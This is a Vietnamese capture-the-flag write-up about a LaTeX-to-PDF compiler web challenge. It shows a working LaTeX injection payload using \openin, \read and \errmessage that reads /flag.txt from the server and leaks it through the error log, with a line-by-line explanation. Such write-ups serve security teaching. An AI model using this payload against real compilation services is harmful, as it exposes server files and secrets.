![image](https://github.com/user-attachments/assets/74aac643-dc8b-4cd8-873a-c86b73317642)

# **ANALYZE**

Trang web này chính là 1 trình biên dịch latex thành file PDF :

![image](https://github.com/user-attachments/assets/94f7ee1c-8f04-4011-943d-2457d236af3b)

Nếu quá trình biên dịch thất bại, log file sẽ được trả về
Có một flag được lưu trong file hệ thống tại đường dẫn: `/flag.txt`

Và ở bài này thì khả năng cao chính là lỗ hổng `LaTeX Injection`

Thì sơ qua về lỗ hổng này là : 
```
Người dùng có thể chèn mã LaTeX tùy ý vào document được biên dịch.

Nếu không kiểm soát đủ các lệnh nguy hiểm (như \input, \openin, \write18, ...), người dùng có thể tương tác với hệ thống tệp.
```

Và sau khi thử với 1 số câu lệnh thì tôi rút ra được là : 
-Cho phép chèn mã LaTeX tùy ý
-Trả về log nếu có lỗi LaTeX

![image](https://github.com/user-attachments/assets/53036fa6-3748-48c2-8d3b-2f2a0ff77227)


-Không chặn \openin, \read

![image](https://github.com/user-attachments/assets/4ea51e10-817d-4728-a424-b89239b271ad)


-File /flag.txt tồn tại và có quyền đọc

![image](https://github.com/user-attachments/assets/b31a8ef8-9ddd-4f31-82fa-04265ea7c5fc)


# **EXPLOIT **


PAYLOAD của bài : 
```
\newread\file
\openin\file=/flag.txt
\read\file to \filecontent
\errmessage{\filecontent}

```
Giải thích : 
```
\newread\file :	Tạo một "handle" (biến tạm) để đọc file.
\openin\file=/flag.txt :	Mở file /flag.txt để đọc.
\read\file to \filecontent :	Đọc 1 dòng đầu tiên của file vào biến \filecontent.
\errmessage{\filecontent} :	Tạo lỗi chứa nội dung \filecontent, từ đó nội dung file xuất hiện trong log.
```

![image](https://github.com/user-attachments/assets/3e182a08-4cca-4e88-b148-68b86b042b56)


# **FLAG **
`tjctf{f1l3_i0_1n_l4t3x?}`
